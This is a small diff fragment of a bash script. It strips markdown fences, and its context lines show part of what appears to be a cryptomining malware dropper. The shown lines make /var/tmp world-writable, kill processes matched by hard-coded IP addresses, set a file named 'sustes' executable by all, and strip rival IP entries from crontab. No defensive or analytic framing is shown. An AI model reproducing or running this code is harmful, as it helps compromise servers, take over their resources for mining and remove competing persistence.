@@ -1,4 +1,3 @@
-```shell
 #!/bin/bash
 mkdir /var/tmp
 chmod 777 /var/tmp
@@ -228,4 +227,4 @@ pkill -f 95.142.40.81
 pkill -f 192.99.142.232
 chmod 777 /var/tmp/sustes
 crontab -l | sed '/185.222.210.59/d' | crontab -
-```
+
